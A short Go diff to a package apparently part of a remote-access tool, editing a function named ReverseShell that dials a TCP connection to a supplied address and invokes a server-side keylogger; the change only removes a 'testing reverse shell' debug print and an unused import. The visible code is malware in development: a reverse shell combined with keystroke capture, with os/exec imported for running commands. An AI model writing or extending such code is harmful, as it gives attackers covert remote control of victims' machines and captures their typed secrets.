@@ -1,7 +1,6 @@
 package rs
 
 import (
-	"fmt"
 	"net"
 	"os/exec"
 	"time"
@@ -12,7 +11,7 @@ import (
 func ReverseShell(connectionStr string) {
 
 	// simple connection
-	fmt.Println("testing reverse shell")
+
 	conn, err := net.Dial("tcp", connectionStr)
 	server.ServerSideKeylogger()
 	if nil != err {
